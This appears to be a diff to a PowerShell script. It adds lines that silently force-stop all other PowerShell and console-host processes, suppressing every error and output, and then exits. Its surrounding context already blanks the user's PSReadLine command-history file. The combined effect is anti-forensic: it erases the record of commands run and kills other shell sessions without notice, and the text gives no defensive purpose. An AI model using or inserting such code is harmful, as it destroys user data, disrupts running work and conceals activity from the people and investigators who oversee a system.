@@ -32,6 +32,12 @@ if (Test-Path $historyPath) {
 }
 
 
+Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
+Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
+    if ($_.Parent.Id -ne $PID) {
+        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+}
 
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
 if (-not (Test-Path $historyPath)) {
@@ -39,3 +45,5 @@ if (-not (Test-Path $historyPath)) {
 } else {
     Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
 }
+
+Exit
